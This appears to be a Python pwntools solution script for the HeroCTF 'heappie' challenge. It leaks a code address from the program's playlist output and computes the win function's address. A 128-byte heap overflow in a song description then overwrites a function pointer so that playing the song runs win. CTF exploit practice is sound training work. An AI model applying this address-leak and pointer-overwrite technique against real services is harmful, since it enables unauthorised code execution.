# objdump -S heappie
#    00000000000011f9 <win>
#    000000000000127d <play_1>
#    00000000000012b3 <play_2>
#    00000000000012e9 <play_3>
#
# nc pwn.heroctf.fr 6000
#    4. Show playlist
#    >> 4
#    Your playlist:
#    	1. AAAA by BBBB (song: 0x55e44d0a32e9)
#    	2. psum by dolor (song: (nil))
#    	3. 1 by 2 (song: 0x55e44d0a32e9)
#    	4. 3 by 2 (song: 0x55e44d0a327d)
#

from pwn import *

def create_song(misc, description, play=b'y'):
    r.recvuntil(b'>> ')
    r.sendline(b'1')
    r.recvuntil(b'(y/n): ')
    r.sendline(play)
    r.recvuntil(b': ')
    r.sendline(misc)
    r.recvuntil(b': ')
    r.sendline(misc)
    r.recvuntil(b': ')
    r.sendline(description)

r = remote('pwn.heroctf.fr', 6000)

log.info('Creating a random song')
create_song(b'1', b'1', b'y')

log.info('Checking address space via playlist')
r.recvuntil(b'>> ')
r.sendline(b'4')
r.recvuntil(b'song: ')
res = r.recvuntil(b')', drop=True).decode()
win_func = res[:-3] + "1f9"

log.info(f'Win function address: {win_func}, creating new song with overflow in description')
create_song(b'2', b'A' * 128 + p64(int(win_func, 16)), b'y')

log.info(f'Creating the second song that will have the win funtion address')
create_song(b'3', b'3', b'n')

log.info(f'Play "win" song')
r.recvuntil(b'>> ')
r.sendline(b'2')
r.recvuntil(b': ')
r.sendline(b'2')
res = r.recvall(timeout=1).decode()
print(res)

r.close()
